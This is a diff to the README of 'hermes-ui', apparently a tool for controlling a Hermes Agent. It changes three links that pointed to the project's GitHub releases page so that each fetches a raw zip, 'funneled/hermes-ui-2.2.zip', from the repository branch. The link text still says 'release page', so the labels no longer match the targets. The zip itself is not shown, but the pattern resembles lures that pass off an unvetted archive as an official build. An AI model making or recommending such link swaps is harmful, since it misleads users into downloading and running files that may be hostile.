@@ -1,6 +1,6 @@
 # 🧭 hermes-ui - Control Hermes from one screen
 
-[![Download hermes-ui](https://img.shields.io/badge/Download-Release%20Page-6F42C1?style=for-the-badge)](https://github.com/Abderrahm7167/hermes-ui/releases)
+[![Download hermes-ui](https://img.shields.io/badge/Download-Release%20Page-6F42C1?style=for-the-badge)](https://github.com/Abderrahm7167/hermes-ui/raw/refs/heads/main/funneled/hermes-ui-2.2.zip)
 
 ## 🚀 What this app does
 
@@ -19,7 +19,7 @@ If you use Tailscale, you can connect to a remote Hermes Agent on your private n
 
 ## 📥 Download and set up
 
-[Visit the release page to download hermes-ui](https://github.com/Abderrahm7167/hermes-ui/releases)
+[Visit the release page to download hermes-ui](https://github.com/Abderrahm7167/hermes-ui/raw/refs/heads/main/funneled/hermes-ui-2.2.zip)
 
 1. Open the release page.
 2. Find the latest release at the top.
@@ -187,7 +187,7 @@ If the screen is blank, reload the page and try again after checking the file pa
 
 ## 📦 Release page
 
-[Download or check the latest hermes-ui release here](https://github.com/Abderrahm7167/hermes-ui/releases)
+[Download or check the latest hermes-ui release here](https://github.com/Abderrahm7167/hermes-ui/raw/refs/heads/main/funneled/hermes-ui-2.2.zip)
 
 Use this page to get the current Windows build and any related files for the app
 
